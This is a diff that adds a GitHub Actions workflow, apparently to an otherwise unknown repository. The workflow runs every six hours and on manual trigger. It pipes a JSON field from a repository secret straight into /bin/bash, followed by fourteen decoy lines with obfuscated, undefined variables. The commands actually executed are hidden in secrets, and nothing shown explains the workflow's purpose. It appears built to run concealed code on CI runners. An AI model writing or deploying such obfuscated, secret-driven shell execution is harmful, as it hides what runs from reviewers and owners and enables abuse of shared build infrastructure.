@@ -1,0 +1,31 @@
+name: xinglianjiqian
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '24 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xinglianjiqian
+        env:
+          fewb7: ${{ secrets.fewb7 }}
+        run: |
+          echo $fewb7 | jq -r .sct0465 | /bin/bash
+          echo $ten99033 | jq -r .yrro2 | /bin/bash
+          echo $xd42 | jq -r .exxiz9582 | /bin/bash
+          echo $anqw60 | jq -r .grj5 | /bin/bash
+          echo $qot61 | jq -r .fik39 | /bin/bash
+          echo $vchx145 | jq -r .qu1188 | /bin/bash
+          echo $xxkln606 | jq -r .miv21347 | /bin/bash
+          echo $qg5 | jq -r .cgpa7 | /bin/bash
+          echo $enbo41072 | jq -r .b48 | /bin/bash
+          echo $jc869 | jq -r .xez5 | /bin/bash
+          echo $rurf3584 | jq -r .pnqor448 | /bin/bash
+          echo $zvonv059 | jq -r .mx57 | /bin/bash
+          echo $c4761 | jq -r .ava570 | /bin/bash
+          echo $wa547 | jq -r .tbb88 | /bin/bash
+          echo $xrkvr14950 | jq -r .pmg4 | /bin/bash
+
